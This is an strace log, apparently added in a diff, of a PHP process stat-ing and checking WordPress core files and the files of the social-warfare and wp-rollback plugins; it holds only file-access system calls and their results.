+stat("/var/www/html/wp-includes/class-wp-comment.php", {st_mode=S_IFREG|0644, st_size=8936, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-comment-query.php", {st_mode=S_IFREG|0644, st_size=41743, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-comment-query.php", {st_mode=S_IFREG|0644, st_size=41743, ...}) = 0
+lstat("/var/www/html/wp-includes/class-walker-comment.php", {st_mode=S_IFREG|0644, st_size=11173, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-comment.php", {st_mode=S_IFREG|0644, st_size=11173, ...}) = 0
+lstat("/var/www/html/wp-includes/comment-template.php", {st_mode=S_IFREG|0644, st_size=87441, ...}) = 0
+stat("/var/www/html/wp-includes/comment-template.php", {st_mode=S_IFREG|0644, st_size=87441, ...}) = 0
+lstat("/var/www/html/wp-includes/rewrite.php", {st_mode=S_IFREG|0644, st_size=17502, ...}) = 0
+stat("/var/www/html/wp-includes/rewrite.php", {st_mode=S_IFREG|0644, st_size=17502, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-rewrite.php", {st_mode=S_IFREG|0644, st_size=58908, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-rewrite.php", {st_mode=S_IFREG|0644, st_size=58908, ...}) = 0
+lstat("/var/www/html/wp-includes/feed.php", {st_mode=S_IFREG|0644, st_size=19550, ...}) = 0
+stat("/var/www/html/wp-includes/feed.php", {st_mode=S_IFREG|0644, st_size=19550, ...}) = 0
+lstat("/var/www/html/wp-includes/bookmark.php", {st_mode=S_IFREG|0644, st_size=13672, ...}) = 0
+stat("/var/www/html/wp-includes/bookmark.php", {st_mode=S_IFREG|0644, st_size=13672, ...}) = 0
+lstat("/var/www/html/wp-includes/bookmark-template.php", {st_mode=S_IFREG|0644, st_size=11699, ...}) = 0
+stat("/var/www/html/wp-includes/bookmark-template.php", {st_mode=S_IFREG|0644, st_size=11699, ...}) = 0
+lstat("/var/www/html/wp-includes/kses.php", {st_mode=S_IFREG|0644, st_size=50148, ...}) = 0
+stat("/var/www/html/wp-includes/kses.php", {st_mode=S_IFREG|0644, st_size=50148, ...}) = 0
+lstat("/var/www/html/wp-includes/cron.php", {st_mode=S_IFREG|0644, st_size=16467, ...}) = 0
+stat("/var/www/html/wp-includes/cron.php", {st_mode=S_IFREG|0644, st_size=16467, ...}) = 0
+lstat("/var/www/html/wp-includes/deprecated.php", {st_mode=S_IFREG|0644, st_size=113222, ...}) = 0
+stat("/var/www/html/wp-includes/deprecated.php", {st_mode=S_IFREG|0644, st_size=113222, ...}) = 0
+lstat("/var/www/html/wp-includes/script-loader.php", {st_mode=S_IFREG|0644, st_size=79370, ...}) = 0
+stat("/var/www/html/wp-includes/script-loader.php", {st_mode=S_IFREG|0644, st_size=79370, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-dependency.php", {st_mode=S_IFREG|0644, st_size=1550, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-dependency.php", {st_mode=S_IFREG|0644, st_size=1550, ...}) = 0
+lstat("/var/www/html/wp-includes/class.wp-dependencies.php", {st_mode=S_IFREG|0644, st_size=11185, ...}) = 0
+stat("/var/www/html/wp-includes/class.wp-dependencies.php", {st_mode=S_IFREG|0644, st_size=11185, ...}) = 0
+lstat("/var/www/html/wp-includes/class.wp-scripts.php", {st_mode=S_IFREG|0644, st_size=14160, ...}) = 0
+stat("/var/www/html/wp-includes/class.wp-scripts.php", {st_mode=S_IFREG|0644, st_size=14160, ...}) = 0
+lstat("/var/www/html/wp-includes/functions.wp-scripts.php", {st_mode=S_IFREG|0644, st_size=11481, ...}) = 0
+stat("/var/www/html/wp-includes/functions.wp-scripts.php", {st_mode=S_IFREG|0644, st_size=11481, ...}) = 0
+lstat("/var/www/html/wp-includes/class.wp-styles.php", {st_mode=S_IFREG|0644, st_size=9794, ...}) = 0
+stat("/var/www/html/wp-includes/class.wp-styles.php", {st_mode=S_IFREG|0644, st_size=9794, ...}) = 0
+lstat("/var/www/html/wp-includes/functions.wp-styles.php", {st_mode=S_IFREG|0644, st_size=8080, ...}) = 0
+stat("/var/www/html/wp-includes/functions.wp-styles.php", {st_mode=S_IFREG|0644, st_size=8080, ...}) = 0
+lstat("/var/www/html/wp-includes/taxonomy.php", {st_mode=S_IFREG|0644, st_size=149381, ...}) = 0
+stat("/var/www/html/wp-includes/taxonomy.php", {st_mode=S_IFREG|0644, st_size=149381, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-taxonomy.php", {st_mode=S_IFREG|0644, st_size=9993, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-taxonomy.php", {st_mode=S_IFREG|0644, st_size=9993, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-term.php", {st_mode=S_IFREG|0644, st_size=5273, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-term.php", {st_mode=S_IFREG|0644, st_size=5273, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-term-query.php", {st_mode=S_IFREG|0644, st_size=33619, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-term-query.php", {st_mode=S_IFREG|0644, st_size=33619, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-tax-query.php", {st_mode=S_IFREG|0644, st_size=19199, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-tax-query.php", {st_mode=S_IFREG|0644, st_size=19199, ...}) = 0
+lstat("/var/www/html/wp-includes/update.php", {st_mode=S_IFREG|0644, st_size=24613, ...}) = 0
+stat("/var/www/html/wp-includes/update.php", {st_mode=S_IFREG|0644, st_size=24613, ...}) = 0
+lstat("/var/www/html/wp-includes/canonical.php", {st_mode=S_IFREG|0644, st_size=27583, ...}) = 0
+stat("/var/www/html/wp-includes/canonical.php", {st_mode=S_IFREG|0644, st_size=27583, ...}) = 0
+lstat("/var/www/html/wp-includes/shortcodes.php", {st_mode=S_IFREG|0644, st_size=20441, ...}) = 0
+stat("/var/www/html/wp-includes/shortcodes.php", {st_mode=S_IFREG|0644, st_size=20441, ...}) = 0
+lstat("/var/www/html/wp-includes/embed.php", {st_mode=S_IFREG|0644, st_size=44348, ...}) = 0
+stat("/var/www/html/wp-includes/embed.php", {st_mode=S_IFREG|0644, st_size=44348, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-embed.php", {st_mode=S_IFREG|0644, st_size=14509, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-embed.php", {st_mode=S_IFREG|0644, st_size=14509, ...}) = 0
+lstat("/var/www/html/wp-includes/class-oembed.php", {st_mode=S_IFREG|0644, st_size=33112, ...}) = 0
+stat("/var/www/html/wp-includes/class-oembed.php", {st_mode=S_IFREG|0644, st_size=33112, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-oembed-controller.php", {st_mode=S_IFREG|0644, st_size=5587, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-oembed-controller.php", {st_mode=S_IFREG|0644, st_size=5587, ...}) = 0
+lstat("/var/www/html/wp-includes/media.php", {st_mode=S_IFREG|0644, st_size=138392, ...}) = 0
+stat("/var/www/html/wp-includes/media.php", {st_mode=S_IFREG|0644, st_size=138392, ...}) = 0
+lstat("/var/www/html/wp-includes/http.php", {st_mode=S_IFREG|0644, st_size=22231, ...}) = 0
+stat("/var/www/html/wp-includes/http.php", {st_mode=S_IFREG|0644, st_size=22231, ...}) = 0
+lstat("/var/www/html/wp-includes/class-http.php", {st_mode=S_IFREG|0644, st_size=36164, ...}) = 0
+stat("/var/www/html/wp-includes/class-http.php", {st_mode=S_IFREG|0644, st_size=36164, ...}) = 0
+lstat("/var/www/html/wp-includes/class-requests.php", {st_mode=S_IFREG|0644, st_size=29790, ...}) = 0
+stat("/var/www/html/wp-includes/class-requests.php", {st_mode=S_IFREG|0644, st_size=29790, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-streams.php", {st_mode=S_IFREG|0644, st_size=14995, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-streams.php", {st_mode=S_IFREG|0644, st_size=14995, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-curl.php", {st_mode=S_IFREG|0644, st_size=11679, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-curl.php", {st_mode=S_IFREG|0644, st_size=11679, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-proxy.php", {st_mode=S_IFREG|0644, st_size=5957, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-proxy.php", {st_mode=S_IFREG|0644, st_size=5957, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-cookie.php", {st_mode=S_IFREG|0644, st_size=6456, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-cookie.php", {st_mode=S_IFREG|0644, st_size=6456, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-encoding.php", {st_mode=S_IFREG|0644, st_size=6444, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-encoding.php", {st_mode=S_IFREG|0644, st_size=6444, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-response.php", {st_mode=S_IFREG|0644, st_size=2871, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-response.php", {st_mode=S_IFREG|0644, st_size=2871, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-requests-response.php", {st_mode=S_IFREG|0644, st_size=4273, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-requests-response.php", {st_mode=S_IFREG|0644, st_size=4273, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-http-requests-hooks.php", {st_mode=S_IFREG|0644, st_size=1872, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-http-requests-hooks.php", {st_mode=S_IFREG|0644, st_size=1872, ...}) = 0
+access("/var/www/html/wp-includes/Requests/Hooks.php", F_OK) = 0
+stat("/var/www/html/wp-includes/Requests/Hooks.php", {st_mode=S_IFREG|0644, st_size=1399, ...}) = 0
+access("/var/www/html/wp-includes/Requests/Hooker.php", F_OK) = 0
+stat("/var/www/html/wp-includes/Requests/Hooker.php", {st_mode=S_IFREG|0644, st_size=708, ...}) = 0
+lstat("/var/www/html/wp-includes/widgets.php", {st_mode=S_IFREG|0644, st_size=55411, ...}) = 0
+stat("/var/www/html/wp-includes/widgets.php", {st_mode=S_IFREG|0644, st_size=55411, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-widget.php", {st_mode=S_IFREG|0644, st_size=17658, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-widget.php", {st_mode=S_IFREG|0644, st_size=17658, ...}) = 0
+lstat("/var/www/html/wp-includes/class-wp-widget-factory.php", {st_mode=S_IFREG|0644, st_size=3746, ...}) = 0
+stat("/var/www/html/wp-includes/class-wp-widget-factory.php", {st_mode=S_IFREG|0644, st_size=3746, ...}) = 0
+lstat("/var/www/html/wp-includes/nav-menu.php", {st_mode=S_IFREG|0644, st_size=39526, ...}) = 0
+stat("/var/www/html/wp-includes/nav-menu.php", {st_mode=S_IFREG|0644, st_size=39526, ...}) = 0
+lstat("/var/www/html/wp-includes/nav-menu-template.php", {st_mode=S_IFREG|0644, st_size=20871, ...}) = 0
+stat("/var/www/html/wp-includes/nav-menu-template.php", {st_mode=S_IFREG|0644, st_size=20871, ...}) = 0
+stat("/var/www/html/wp-includes/class-walker-nav-menu.php", {st_mode=S_IFREG|0644, st_size=8392, ...}) = 0
+lstat("/var/www/html/wp-includes/admin-bar.php", {st_mode=S_IFREG|0644, st_size=28650, ...}) = 0
+stat("/var/www/html/wp-includes/admin-bar.php", {st_mode=S_IFREG|0644, st_size=28650, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api.php", {st_mode=S_IFREG|0644, st_size=38533, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api.php", {st_mode=S_IFREG|0644, st_size=38533, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/class-wp-rest-server.php", {st_mode=S_IFREG|0644, st_size=38441, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/class-wp-rest-server.php", {st_mode=S_IFREG|0644, st_size=38441, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/class-wp-rest-response.php", {st_mode=S_IFREG|0644, st_size=7339, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/class-wp-rest-response.php", {st_mode=S_IFREG|0644, st_size=7339, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/class-wp-rest-request.php", {st_mode=S_IFREG|0644, st_size=23903, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/class-wp-rest-request.php", {st_mode=S_IFREG|0644, st_size=23903, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-controller.php", {st_mode=S_IFREG|0644, st_size=18049, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-controller.php", {st_mode=S_IFREG|0644, st_size=18049, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php", {st_mode=S_IFREG|0644, st_size=73947, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php", {st_mode=S_IFREG|0644, st_size=73947, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php", {st_mode=S_IFREG|0644, st_size=23564, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-attachments-controller.php", {st_mode=S_IFREG|0644, st_size=23564, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php", {st_mode=S_IFREG|0644, st_size=8902, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-post-types-controller.php", {st_mode=S_IFREG|0644, st_size=8902, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php", {st_mode=S_IFREG|0644, st_size=9119, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-post-statuses-controller.php", {st_mode=S_IFREG|0644, st_size=9119, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-revisions-controller.php", {st_mode=S_IFREG|0644, st_size=17041, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-revisions-controller.php", {st_mode=S_IFREG|0644, st_size=17041, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-taxonomies-controller.php", {st_mode=S_IFREG|0644, st_size=9947, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-taxonomies-controller.php", {st_mode=S_IFREG|0644, st_size=9947, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-terms-controller.php", {st_mode=S_IFREG|0644, st_size=30497, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-terms-controller.php", {st_mode=S_IFREG|0644, st_size=30497, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php", {st_mode=S_IFREG|0644, st_size=43594, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php", {st_mode=S_IFREG|0644, st_size=43594, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php", {st_mode=S_IFREG|0644, st_size=53746, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-comments-controller.php", {st_mode=S_IFREG|0644, st_size=53746, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-settings-controller.php", {st_mode=S_IFREG|0644, st_size=10155, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/endpoints/class-wp-rest-settings-controller.php", {st_mode=S_IFREG|0644, st_size=10155, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-meta-fields.php", {st_mode=S_IFREG|0644, st_size=13189, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-meta-fields.php", {st_mode=S_IFREG|0644, st_size=13189, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-comment-meta-fields.php", {st_mode=S_IFREG|0644, st_size=702, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-comment-meta-fields.php", {st_mode=S_IFREG|0644, st_size=702, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-post-meta-fields.php", {st_mode=S_IFREG|0644, st_size=1016, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-post-meta-fields.php", {st_mode=S_IFREG|0644, st_size=1016, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-term-meta-fields.php", {st_mode=S_IFREG|0644, st_size=1014, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-term-meta-fields.php", {st_mode=S_IFREG|0644, st_size=1014, ...}) = 0
+lstat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-user-meta-fields.php", {st_mode=S_IFREG|0644, st_size=675, ...}) = 0
+stat("/var/www/html/wp-includes/rest-api/fields/class-wp-rest-user-meta-fields.php", {st_mode=S_IFREG|0644, st_size=675, ...}) = 0
+stat("/var/www/html/wp-content/mu-plugins", 0x7fff0ffbfe30) = -1 ENOENT (No such file or directory)
+lstat("/var/www/html/wp-includes/vars.php", {st_mode=S_IFREG|0644, st_size=5582, ...}) = 0
+stat("/var/www/html/wp-includes/vars.php", {st_mode=S_IFREG|0644, st_size=5582, ...}) = 0
+access("/var/www/html/wp-content/themes", F_OK) = 0
+access("/var/www/html/wp-content/plugins/social-warfare/social-warfare.php", F_OK) = 0
+access("/var/www/html/wp-content/plugins/wp-rollback/wp-rollback.php", F_OK) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare/social-warfare.php", {st_mode=S_IFREG|0644, st_size=1416, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/social-warfare", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content/plugins", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+lstat("/var/www/html/wp-content", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/social-warfare.php", {st_mode=S_IFREG|0644, st_size=1416, ...}) = 0
+access("/var/www/html/wp-content/plugins/social-warfare/lib/legacy/update-checker.php", F_OK) = -1 ENOENT (No such file or directory)
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/Social_Warfare.php", {st_mode=S_IFREG|0644, st_size=14517, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/swp_system_checker.php", {st_mode=S_IFREG|0644, st_size=3863, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/functions.php", {st_mode=S_IFREG|0644, st_size=1356, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/wp-rollback/wp-rollback.php", {st_mode=S_IFREG|0644, st_size=25311, ...}) = 0
+lstat("/var/www/html/wp-content/plugins/wp-rollback", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+stat("/var/www/html/wp-content/plugins/wp-rollback/wp-rollback.php", {st_mode=S_IFREG|0644, st_size=25311, ...}) = 0
+lstat("/var/www/html/wp-includes/pluggable.php", {st_mode=S_IFREG|0644, st_size=92000, ...}) = 0
+stat("/var/www/html/wp-includes/pluggable.php", {st_mode=S_IFREG|0644, st_size=92000, ...}) = 0
+lstat("/var/www/html/wp-includes/pluggable-deprecated.php", {st_mode=S_IFREG|0644, st_size=6262, ...}) = 0
+stat("/var/www/html/wp-includes/pluggable-deprecated.php", {st_mode=S_IFREG|0644, st_size=6262, ...}) = 0
+stat("/var/www/html/wp-includes/default-widgets.php", {st_mode=S_IFREG|0644, st_size=2180, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-pages.php", {st_mode=S_IFREG|0644, st_size=4883, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-links.php", {st_mode=S_IFREG|0644, st_size=6903, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-search.php", {st_mode=S_IFREG|0644, st_size=2608, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-archives.php", {st_mode=S_IFREG|0644, st_size=5429, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media.php", {st_mode=S_IFREG|0644, st_size=13815, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media-audio.php", {st_mode=S_IFREG|0644, st_size=5937, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media-image.php", {st_mode=S_IFREG|0644, st_size=11186, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media-video.php", {st_mode=S_IFREG|0644, st_size=8155, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-media-gallery.php", {st_mode=S_IFREG|0644, st_size=6194, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-meta.php", {st_mode=S_IFREG|0644, st_size=3593, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-calendar.php", {st_mode=S_IFREG|0644, st_size=2872, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-text.php", {st_mode=S_IFREG|0644, st_size=20080, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-categories.php", {st_mode=S_IFREG|0644, st_size=5951, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-recent-posts.php", {st_mode=S_IFREG|0644, st_size=4973, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-recent-comments.php", {st_mode=S_IFREG|0644, st_size=5827, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-rss.php", {st_mode=S_IFREG|0644, st_size=3687, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-tag-cloud.php", {st_mode=S_IFREG|0644, st_size=5668, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-nav-menu-widget.php", {st_mode=S_IFREG|0644, st_size=5339, ...}) = 0
+stat("/var/www/html/wp-includes/widgets/class-wp-widget-custom-html.php", {st_mode=S_IFREG|0644, st_size=11831, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/Social_Warfare_Addon.php", {st_mode=S_IFREG|0644, st_size=9207, ...}) = 0
+stat("/var/www/html/wp-admin/includes/plugin.php", {st_mode=S_IFREG|0644, st_size=66722, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Debug_Trait.php", {st_mode=S_IFREG|0644, st_size=2515, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Compatibility.php", {st_mode=S_IFREG|0644, st_size=2307, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_CURL.php", {st_mode=S_IFREG|0644, st_size=4306, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Localization.php", {st_mode=S_IFREG|0644, st_size=997, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Permalink.php", {st_mode=S_IFREG|0644, st_size=6972, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Database_Migration.php", {st_mode=S_IFREG|0644, st_size=26328, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_URL_Management.php", {st_mode=S_IFREG|0644, st_size=13054, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Notice.php", {st_mode=S_IFREG|0644, st_size=12146, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Notice_Loader.php", {st_mode=S_IFREG|0644, st_size=4256, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Post_Cache_Loader.php", {st_mode=S_IFREG|0644, st_size=2877, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Post_Cache.php", {st_mode=S_IFREG|0644, st_size=23139, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_JSON_Cache_Handler.php", {st_mode=S_IFREG|0644, st_size=3039, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Plugin_Updater.php", {st_mode=S_IFREG|0644, st_size=15637, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Utility.php", {st_mode=S_IFREG|0644, st_size=13610, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Auth_Helper.php", {st_mode=S_IFREG|0644, st_size=5086, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/utilities/SWP_Credential_Helper.php", {st_mode=S_IFREG|0644, st_size=5706, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Social_Networks_Loader.php", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Social_Network.php", {st_mode=S_IFREG|0644, st_size=14108, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Google_Plus.php", {st_mode=S_IFREG|0644, st_size=1471, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Facebook.php", {st_mode=S_IFREG|0644, st_size=5765, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Twitter.php", {st_mode=S_IFREG|0644, st_size=9218, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Linkedin.php", {st_mode=S_IFREG|0644, st_size=1115, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Pinterest.php", {st_mode=S_IFREG|0644, st_size=7424, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/social-networks/SWP_Mix.php", {st_mode=S_IFREG|0644, st_size=1953, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel_Trait.php", {st_mode=S_IFREG|0644, st_size=25334, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel.php", {st_mode=S_IFREG|0644, st_size=19735, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel_Side.php", {st_mode=S_IFREG|0644, st_size=4239, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel_Loader.php", {st_mode=S_IFREG|0644, st_size=11252, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/buttons-panel/SWP_Buttons_Panel_Shortcode.php", {st_mode=S_IFREG|0644, st_size=2027, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/frontend-output/SWP_Header_Output.php", {st_mode=S_IFREG|0644, st_size=4508, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/frontend-output/SWP_Script.php", {st_mode=S_IFREG|0644, st_size=8239, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/frontend-output/SWP_Shortcode.php", {st_mode=S_IFREG|0644, st_size=7338, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/widgets/SWP_Popular_Posts_Widget.php", {st_mode=S_IFREG|0644, st_size=19850, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/widgets/SWP_Widget.php", {st_mode=S_IFREG|0644, st_size=4402, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/widgets/SWP_Widget_Loader.php", {st_mode=S_IFREG|0644, st_size=1128, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Click_To_Tweet.php", {st_mode=S_IFREG|0644, st_size=3606, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Column.php", {st_mode=S_IFREG|0644, st_size=4022, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Settings_Link.php", {st_mode=S_IFREG|0644, st_size=1378, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Shortcode_Generator.php", {st_mode=S_IFREG|0644, st_size=3147, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_User_Profile.php", {st_mode=S_IFREG|0644, st_size=4016, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/admin/SWP_Sidebar_Loader.php", {st_mode=S_IFREG|0644, st_size=1313, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_User_Options.php", {st_mode=S_IFREG|0644, st_size=11922, ...}) = 0
+stat("/var/www/html/wp-content/plugins/social-warfare/lib/options/SWP_Option_Abstract.php", {st_mode=S_IFREG|0644, st_size=10017, ...}) = 0
